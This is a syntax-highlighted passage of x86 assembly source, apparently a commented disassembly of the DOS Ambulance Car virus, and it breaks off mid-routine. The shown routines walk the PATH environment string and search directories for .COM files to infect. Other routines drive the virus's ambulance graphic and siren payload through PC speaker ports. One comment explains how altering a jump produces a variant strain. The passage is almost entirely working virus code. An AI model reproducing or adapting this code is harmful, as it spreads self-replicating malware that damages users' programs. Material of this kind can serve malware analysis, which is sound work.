</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">loadpath</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">    </span><span class="sc1">; this procedure checks for the</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">psp_envirn_seg</span><span class="sc0"> </span><span class="sc1">; existence of the ASCII path string in the </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; environment block of the program </span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                 </span><span class="sc1">; segment prefix (in this case psp_envirn_seg) </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">             </span><span class="sc1">; if it exists, Ambulance Car copies</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; the entire string into a buffer by using</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">data_3e</span><span class="sc0">      </span><span class="sc1">; '/' and ';' as cues. The virus then</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                 </span><span class="sc1">; sets the DTA to a directory</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">; found in the path and executes a simple </span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">loc_8</span><span class="sc0">              </span><span class="sc1">; file search. If unproductive, it</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; recursively searches the path</span><span class="sc0">
</span><span class="sc5">loc_6</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; before defaulting to the current </span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; directory</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4150h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loc_7</span><span class="sc0">                   
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4854h</span><span class="sc0"> 
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">loc_9</span><span class="sc0">                   
</span><span class="sc5">loc_7</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">loc_6</span><span class="sc0">                   </span><span class="sc1">; jump if not zero</span><span class="sc0">
</span><span class="sc5">loc_8</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">428h</span><span class="sc4">]</span><span class="sc0">           
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loc_14</span><span class="sc0">
</span><span class="sc5">loc_9</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">loc_10</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">428h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; load effective address of buffer</span><span class="sc0">
</span><span class="sc5">loc_11</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; copy a byte from the path</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">loc_13</span><span class="sc0">               </span><span class="sc1">; jump if zero</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">               </span><span class="sc1">; found a divider? ';'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">loc_12</span><span class="sc0">               </span><span class="sc1">; jump if equal, continue copying path</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loc_11</span><span class="sc0">         </span><span class="sc1">; loop around, continue copying</span><span class="sc0">
</span><span class="sc5">loc_12</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">loc_13</span><span class="sc0">                  
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">loc_10</span><span class="sc0">                  </span><span class="sc1">; Jump if not zero</span><span class="sc0">
</span><span class="sc5">loc_13</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">5Ch</span><span class="sc0">     </span><span class="sc1">; compare with '\'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">loc_14</span><span class="sc0">                  </span><span class="sc1">; jump if equal</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">5Ch</span><span class="sc0">       </span><span class="sc1">; compare with '\'</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">loc_14</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">data_16</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2E2Ah</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">                    </span><span class="sc1">; copy portion of path, store ax to es:[di]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4F43h</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; Store ax to es:[di]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; Store ax to es:[di]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; get current DTA</span><span class="sc0">
                                         </span><span class="sc1">; move it into es:bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">data_17</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">data_18</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">478h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; address of filemask</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; set the DTA to first dir in path</span><span class="sc0">
                                         </span><span class="sc1">; disk xfer area, ds:dx</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">428h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; load effective address</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; zero register</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                  </span><span class="sc1">; find first file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                      
                                         
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">loc_15</span><span class="sc0">                  </span><span class="sc1">; jump if carry = 0</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">data_19</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loc_18</span><span class="sc0">
</span><span class="sc5">loc_15</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">data_3e</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">loc_16</span><span class="sc0">                  </span><span class="sc1">; Jump if zero</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                  
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     
                                         </span><span class="sc1">; find next file</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">loc_15</span><span class="sc0">                  </span><span class="sc1">; jump if carry = 0</span><span class="sc0">
</span><span class="sc5">loc_16</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">data_16</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">496h</span><span class="sc4">]</span><span class="sc0">            
</span><span class="sc5">loc_17</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; Store al to es:[di]</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">loc_17</span><span class="sc0">                  </span><span class="sc1">; Jump if not zero</span><span class="sc0">
</span><span class="sc5">loc_18</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">data_18</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">data_17</span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; DOS Services  ah=function 1Ah</span><span class="sc0">
                                         </span><span class="sc1">; set DTA(disk xfer area), ds:dx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">; return to check_infect</span><span class="sc0">
</span><span class="sc5">loadpath</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">sound_fury</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">       </span><span class="sc1">;sets up Ambulance Car effect, but</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; other than that, I have no idea</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">40Fh</span><span class="sc4">][</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; subroutines and procs from</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                       </span><span class="sc1">; here on down manage the</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                       </span><span class="sc1">; Ambulance Car graphic and</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loc_19</span><span class="sc0">                     </span><span class="sc1">; siren effect</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">data_1e</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">loc_19</span><span class="sc0">                 </span><span class="sc1">; &lt;= comment this out and you'll</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">data_1e</span><span class="sc0">    </span><span class="sc1">; get a corrupted version of the</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sub_5</span><span class="sc0">                  </span><span class="sc1">; Car effect everytime the virus</span><span class="sc0">
</span><span class="sc5">loc_19</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; executes. If you fiddle around </span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; with it enough you'll eventually</span><span class="sc0">
         </span><span class="sc6">retn</span><span class="sc0">                           </span><span class="sc1">; get the strain known as RedX-Any,</span><span class="sc0">
</span><span class="sc5">sound_fury</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">              </span><span class="sc1">; for RedCross anytime.</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">sub_5</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0B800h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">data_2e</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loc_20</span><span class="sc0">                  
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0B000h</span><span class="sc0">
</span><span class="sc5">loc_20</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0FFF0h</span><span class="sc0">
</span><span class="sc5">loc_21</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">

</span><span class="sc5">locloop_22</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sub_8</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">locloop_22</span><span class="sc0">              </span><span class="sc1">; Loop if cx &gt; 0</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sub_7</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sub_9</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loc_21</span><span class="sc0">                  </span><span class="sc1">; Jump if not equal</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sub_6</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">sub_5</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">sub_6</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">          </span><span class="sc1">; cycles speaker on for siren</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                  </span><span class="sc1">; port 61h, 8255 port B, read</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">
         </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; port 61h, 8255 B - spkr, etc</span><span class="sc0">
                                         </span><span class="sc1">;  al = 0, disable parity</span><span class="sc0">
         </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">sub_6</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">sub_7</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">            </span><span class="sc1">; more speaker stuff</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">7D0h</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">loc_23</span><span class="sc0">                  
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0BB8h</span><span class="sc0">
</span><span class="sc5">loc_23</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                  </span><span class="sc1">; port 61h, 8255 port B, read</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">loc_24</span><span class="sc0">                  
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; port 61h, 8255 B - spkr, etc</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc0">
         </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; port 43h, 8253 wrt timr mode</span><span class="sc0">
</span><span class="sc5">loc_24</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; port 42h, 8253 timer 2 spkr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; port 42h, 8253 timer 2 spkr</span><span class="sc0">
         </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">sub_7</span><span class="sc0">            </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                               SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">sub_8</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3BFh</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Load effective addr</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; Zero ?</span><span class="sc0">
         </span><span class="sc6">js</span><span class="sc0">      </span><span class="sc5">loc_27</span><span class="sc0">                  </span><span class="sc1">; Jump if sign=1</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
